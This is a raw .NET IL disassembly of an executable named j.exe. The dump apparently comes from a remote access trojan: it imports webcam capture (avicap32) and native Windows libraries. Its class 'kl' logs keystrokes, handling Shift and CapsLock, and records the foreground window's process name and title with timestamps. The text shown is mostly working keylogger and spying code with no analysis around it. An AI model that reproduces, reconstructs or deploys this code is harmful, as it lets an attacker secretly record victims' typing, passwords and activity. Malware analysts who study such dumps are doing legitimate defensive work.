
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.0.30319.1
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v2.0.50727
.module extern user32
.module extern user32.dll
.module extern kernel32
.module extern avicap32.dll
.module extern ntdll
.module extern winmm.dll
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 8:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System.Drawing
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 2:0:0:0
}
.assembly j
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 

  // --- The following custom attribute is added automatically, do not uncomment -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 07 01 00 00 00 00 ) 

  .hash algorithm 0x00008004
  .ver 0:0:0:0
}
.module j.exe
// MVID: {27504596-2C60-4F3E-A46E-03C225C1BB1F}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00000003    //  ILONLY 32BITREQUIRED
// Image base: 0x0000000001250000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi My.MyApplication
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8.
                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase::.ctor()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method MyApplication::.ctor

} // end of class My.MyApplication

.class private auto ansi My.MyComputer
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer
{
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8.
                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0..
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       10 (0xa)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0007:  nop
    IL_0008:  nop
    IL_0009:  ret
  } // end of method MyComputer::.ctor

} // end of class My.MyComputer

.class private auto ansi sealed beforefieldinit My.MyProject
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8.
                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0..
  .class auto ansi sealed nested assembly MyWebServices
         extends [mscorlib]System.Object
  {
    .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyGroupCollectionAttribute::.ctor(string,
                                                                                                         string,
                                                                                                         string,
                                                                                                         string) = ( 01 00 34 53 79 73 74 65 6D 2E 57 65 62 2E 53 65   // ..4System.Web.Se
                                                                                                                     72 76 69 63 65 73 2E 50 72 6F 74 6F 63 6F 6C 73   // rvices.Protocols
                                                                                                                     2E 53 6F 61 70 48 74 74 70 43 6C 69 65 6E 74 50   // .SoapHttpClientP
                                                                                                                     72 6F 74 6F 63 6F 6C 12 43 72 65 61 74 65 5F 5F   // rotocol.Create__
                                                                                                                     49 6E 73 74 61 6E 63 65 5F 5F 13 44 69 73 70 6F   // Instance__.Dispo
                                                                                                                     73 65 5F 5F 49 6E 73 74 61 6E 63 65 5F 5F 00 00   // se__Instance__..
                                                                                                                     00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .method public strict virtual instance bool 
            Equals(object o) cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       18 (0x12)
      .maxstack  2
      .locals init (bool V_0)
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  ldarg.1
      IL_0003:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0008:  call       instance bool [mscorlib]System.Object::Equals(object)
      IL_000d:  stloc.0
      IL_000e:  br.s       IL_0010

      IL_0010:  ldloc.0
      IL_0011:  ret
    } // end of method MyWebServices::Equals

    .method public strict virtual instance int32 
            GetHashCode() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       12 (0xc)
      .maxstack  1
      .locals init (int32 V_0)
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  call       instance int32 [mscorlib]System.Object::GetHashCode()
      IL_0007:  stloc.0
      IL_0008:  br.s       IL_000a

      IL_000a:  ldloc.0
      IL_000b:  ret
    } // end of method MyWebServices::GetHashCode

    .method assembly hidebysig instance class [mscorlib]System.Type 
            GetType() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       16 (0x10)
      .maxstack  1
      .locals init (class [mscorlib]System.Type V_0)
      IL_0000:  nop
      IL_0001:  ldtoken    My.MyProject/MyWebServices
      IL_0006:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_000b:  stloc.0
      IL_000c:  br.s       IL_000e

      IL_000e:  ldloc.0
      IL_000f:  ret
    } // end of method MyWebServices::GetType

    .method public strict virtual instance string 
            ToString() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       12 (0xc)
      .maxstack  1
      .locals init (string V_0)
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  call       instance string [mscorlib]System.Object::ToString()
      IL_0007:  stloc.0
      IL_0008:  br.s       IL_000a

      IL_000a:  ldloc.0
      IL_000b:  ret
    } // end of method MyWebServices::ToString

    .method private static !!T  Create__Instance__<.ctor T>(!!T 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       32 (0x20)
      .maxstack  2
      .locals init (!!T V_0,
               bool V_1)
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  box        !!T
      IL_0007:  ldnull
      IL_0008:  ceq
      IL_000a:  stloc.1
      IL_000b:  ldloc.1
      IL_000c:  brfalse.s  IL_0018

      IL_000e:  call       !!0 [mscorlib]System.Activator::CreateInstance<!!0>()
      IL_0013:  stloc.0
      IL_0014:  br.s       IL_001e

      IL_0016:  br.s       IL_001d

      IL_0018:  nop
      IL_0019:  ldarg.0
      IL_001a:  stloc.0
      IL_001b:  br.s       IL_001e

      IL_001d:  nop
      IL_001e:  ldloc.0
      IL_001f:  ret
    } // end of method MyWebServices::Create__Instance__

    .method private instance void  Dispose__Instance__<T>(!!T& 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       18 (0x12)
      .maxstack  2
      .locals init (!!T V_0)
      IL_0000:  nop
      IL_0001:  ldarg.1
      IL_0002:  ldloca.s   V_0
      IL_0004:  initobj    !!T
      IL_000a:  ldloc.0
      IL_000b:  stobj      !!T
      IL_0010:  nop
      IL_0011:  ret
    } // end of method MyWebServices::Dispose__Instance__

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       10 (0xa)
      .maxstack  8
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0007:  nop
      IL_0008:  nop
      IL_0009:  ret
    } // end of method MyWebServices::.ctor

  } // end of class MyWebServices

  .class auto ansi sealed nested assembly ThreadSafeObjectProvider`1<.ctor T>
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
    .field private static !T m_ThreadStaticValue
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.ThreadStaticAttribute::.ctor() = ( 01 00 00 00 ) 
    .method assembly specialname instance !T 
            get_GetInstance() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       38 (0x26)
      .maxstack  2
      .locals init (!T V_0,
               bool V_1)
      IL_0000:  nop
      IL_0001:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0006:  box        !T
      IL_000b:  ldnull
      IL_000c:  ceq
      IL_000e:  stloc.1
      IL_000f:  ldloc.1
      IL_0010:  brfalse.s  IL_001c

      IL_0012:  call       !!0 [mscorlib]System.Activator::CreateInstance<!T>()
      IL_0017:  stsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_001c:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0021:  stloc.0
      IL_0022:  br.s       IL_0024

      IL_0024:  ldloc.0
      IL_0025:  ret
    } // end of method ThreadSafeObjectProvider`1::get_GetInstance

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       10 (0xa)
      .maxstack  8
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0007:  nop
      IL_0008:  nop
      IL_0009:  ret
    } // end of method ThreadSafeObjectProvider`1::.ctor

    .property instance !T GetInstance()
    {
      .get instance !T My.MyProject/ThreadSafeObjectProvider`1::get_GetInstance()
    } // end of property ThreadSafeObjectProvider`1::GetInstance
  } // end of class ThreadSafeObjectProvider`1

  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> m_ComputerObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> m_AppObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> m_UserObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> m_MyWebServicesObjectProvider
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       42 (0x2a)
    .maxstack  8
    IL_0000:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::.ctor()
    IL_0005:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_000a:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::.ctor()
    IL_000f:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0014:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::.ctor()
    IL_0019:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_001e:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::.ctor()
    IL_0023:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0028:  nop
    IL_0029:  ret
  } // end of method MyProject::.cctor

  .method assembly specialname static class My.MyComputer 
          get_Computer() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       16 (0x10)
    .maxstack  1
    .locals init (class My.MyComputer V_0)
    IL_0000:  nop
    IL_0001:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_0006:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::get_GetInstance()
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method MyProject::get_Computer

  .method assembly specialname static class My.MyApplication 
          get_Application() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       16 (0x10)
    .maxstack  1
    .locals init (class My.MyApplication V_0)
    IL_0000:  nop
    IL_0001:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0006:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::get_GetInstance()
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method MyProject::get_Application

  .method assembly specialname static class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User 
          get_User() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       16 (0x10)
    .maxstack  1
    .locals init (class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User V_0)
    IL_0000:  nop
    IL_0001:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_0006:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::get_GetInstance()
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method MyProject::get_User

  .method assembly specialname static class My.MyProject/MyWebServices 
          get_WebServices() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       16 (0x10)
    .maxstack  1
    .locals init (class My.MyProject/MyWebServices V_0)
    IL_0000:  nop
    IL_0001:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0006:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::get_GetInstance()
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method MyProject::get_WebServices

  .property class My.MyComputer Computer()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 43 6F 6D 70 75 74 65 72 00 00 ) // ...My.Computer..
    .get class My.MyComputer My.MyProject::get_Computer()
  } // end of property MyProject::Computer
  .property class My.MyApplication Application()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 41 70 70 6C 69 63 61 74 69 6F   // ...My.Applicatio
                                                                                                       6E 00 00 )                                        // n..
    .get class My.MyApplication My.MyProject::get_Application()
  } // end of property MyProject::Application
  .property class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User
          User()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 07 4D 79 2E 55 73 65 72 00 00 )             // ...My.User..
    .get class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User My.MyProject::get_User()
  } // end of property MyProject::User
  .property class My.MyProject/MyWebServices
          WebServices()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 57 65 62 53 65 72 76 69 63 65   // ...My.WebService
                                                                                                       73 00 00 )                                        // s..
    .get class My.MyProject/MyWebServices My.MyProject::get_WebServices()
  } // end of property MyProject::WebServices
} // end of class My.MyProject

.class public auto ansi j.A
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method A::.ctor

  .method public static void  main() cil managed
  {
    .entrypoint
    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  call       void j.OK::ko()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method A::main

} // end of class j.A

.class public auto ansi j.kl
       extends [mscorlib]System.Object
{
  .field private string LastAS
  .field private int32 LastAV
  .field private valuetype [System.Windows.Forms]System.Windows.Forms.Keys lastKey
  .field public string Logs
  .field public string vn
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       38 (0x26)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  nop
    IL_0007:  ldarg.0
    IL_0008:  ldc.i4.0
    IL_0009:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys j.kl::lastKey
    IL_000e:  ldarg.0
    IL_000f:  ldstr      ""
    IL_0014:  stfld      string j.kl::Logs
    IL_0019:  ldarg.0
    IL_001a:  ldstr      "[kl]"
    IL_001f:  stfld      string j.kl::vn
    IL_0024:  nop
    IL_0025:  ret
  } // end of method kl::.ctor

  .method private instance string  AV() cil managed
  {
    // Code size       252 (0xfc)
    .maxstack  4
    .locals init (string V_0,
             native int V_1,
             int32 V_2,
             class [System]System.Diagnostics.Process V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             valuetype [mscorlib]System.DateTime V_6,
             string[] V_7,
             bool V_8)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  call       native int j.OK::GetForegroundWindow()
      IL_0007:  stloc.1
      IL_0008:  ldloc.1
      IL_0009:  ldloca.s   V_2
      IL_000b:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_0010:  pop
      IL_0011:  ldloc.2
      IL_0012:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0017:  stloc.3
      IL_0018:  ldloca.s   V_1
      IL_001a:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_001f:  ldarg.0
      IL_0020:  ldfld      int32 j.kl::LastAV
      IL_0025:  ceq
      IL_0027:  ldarg.0
      IL_0028:  ldfld      string j.kl::LastAS
      IL_002d:  ldloc.3
      IL_002e:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0033:  ldc.i4.0
      IL_0034:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0039:  ldc.i4.0
      IL_003a:  ceq
      IL_003c:  and
      IL_003d:  ldloc.3
      IL_003e:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0043:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0048:  ldc.i4.0
      IL_0049:  ceq
      IL_004b:  or
      IL_004c:  ldc.i4.0
      IL_004d:  ceq
      IL_004f:  stloc.s    V_8
      IL_0051:  ldloc.s    V_8
      IL_0053:  brfalse.s  IL_00cc

      IL_0055:  ldarg.0
      IL_0056:  ldloca.s   V_1
      IL_0058:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_005d:  stfld      int32 j.kl::LastAV
      IL_0062:  ldarg.0
      IL_0063:  ldloc.3
      IL_0064:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0069:  stfld      string j.kl::LastAS
      IL_006e:  ldc.i4.6
      IL_006f:  newarr     [mscorlib]System.String
      IL_0074:  stloc.s    V_7
      IL_0076:  ldloc.s    V_7
      IL_0078:  ldc.i4.0
      IL_0079:  ldstr      bytearray (0D 00 0A 00 01 00 ) 
      IL_007e:  stelem.ref
      IL_007f:  nop
      IL_0080:  ldloc.s    V_7
      IL_0082:  ldc.i4.1
      IL_0083:  call       valuetype [mscorlib]System.DateTime [Microsoft.VisualBasic]Microsoft.VisualBasic.DateAndTime::get_Now()
      IL_0088:  stloc.s    V_6
      IL_008a:  ldloca.s   V_6
      IL_008c:  ldstr      "yy/MM/dd "
      IL_0091:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_0096:  stelem.ref
      IL_0097:  nop
      IL_0098:  ldloc.s    V_7
      IL_009a:  ldc.i4.2
      IL_009b:  ldloc.3
      IL_009c:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_00a1:  stelem.ref
      IL_00a2:  nop
      IL_00a3:  ldloc.s    V_7
      IL_00a5:  ldc.i4.3
      IL_00a6:  ldstr      " "
      IL_00ab:  stelem.ref
      IL_00ac:  nop
      IL_00ad:  ldloc.s    V_7
      IL_00af:  ldc.i4.4
      IL_00b0:  ldarg.0
      IL_00b1:  ldfld      string j.kl::LastAS
      IL_00b6:  stelem.ref
      IL_00b7:  nop
      IL_00b8:  ldloc.s    V_7
      IL_00ba:  ldc.i4.5
      IL_00bb:  ldstr      bytearray (01 00 0D 00 0A 00 ) 
      IL_00c0:  stelem.ref
      IL_00c1:  nop
      IL_00c2:  ldloc.s    V_7
      IL_00c4:  call       string [mscorlib]System.String::Concat(string[])
      IL_00c9:  stloc.0
      IL_00ca:  leave.s    IL_00fa

      IL_00cc:  nop
      IL_00cd:  leave.s    IL_00f1

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00cf:  dup
      IL_00d0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00d5:  stloc.s    V_5
      IL_00d7:  nop
      IL_00d8:  ldloc.s    V_5
      IL_00da:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00df:  nop
      IL_00e0:  ldloc.s    V_5
      IL_00e2:  stloc.s    V_4
      IL_00e4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e9:  nop
      IL_00ea:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ef:  leave.s    IL_00f1

    }  // end handler
    IL_00f1:  nop
    IL_00f2:  ldstr      ""
    IL_00f7:  stloc.0
    IL_00f8:  br.s       IL_00fa

    IL_00fa:  ldloc.0
    IL_00fb:  ret
  } // end of method kl::AV

  .method private instance string  Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys k) cil managed
  {
    // Code size       594 (0x252)
    .maxstack  3
    .locals init (string V_0,
             bool V_1,
             string V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_5,
             char V_6,
             bool V_7,
             bool V_8)
    IL_0000:  nop
    IL_0001:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0006:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_000b:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_ShiftKeyDown()
    IL_0010:  stloc.1
    IL_0011:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0016:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_001b:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CapsLock()
    IL_0020:  stloc.s    V_7
    IL_0022:  ldloc.s    V_7
    IL_0024:  brfalse.s  IL_0035

    IL_0026:  ldloc.1
    IL_0027:  stloc.s    V_8
    IL_0029:  ldloc.s    V_8
    IL_002b:  brfalse.s  IL_0031

    IL_002d:  ldc.i4.0
    IL_002e:  stloc.1
    IL_002f:  br.s       IL_0034

    IL_0031:  nop
    IL_0032:  ldc.i4.1
    IL_0033:  stloc.1
    IL_0034:  nop
    IL_0035:  nop
    IL_0036:  nop
    .try
    {
      IL_0037:  nop
      IL_0038:  ldarg.1
      IL_0039:  stloc.s    V_5
      IL_003b:  nop
      IL_003c:  ldloc.s    V_5
      IL_003e:  ldc.i4.s   46
      IL_0040:  beq.s      IL_004a

      IL_0042:  ldloc.s    V_5
      IL_0044:  ldc.i4.8
      IL_0045:  beq.s      IL_004a

      IL_0047:  ldc.i4.0
      IL_0048:  br.s       IL_004b

      IL_004a:  ldc.i4.1
      IL_004b:  stloc.s    V_8
      IL_004d:  ldloc.s    V_8
      IL_004f:  brfalse.s  IL_0076

      IL_0051:  ldstr      "["
      IL_0056:  ldarg.1
      IL_0057:  box        [System.Windows.Forms]System.Windows.Forms.Keys
      IL_005c:  callvirt   instance string [mscorlib]System.Enum::ToString()
      IL_0061:  ldstr      "]"
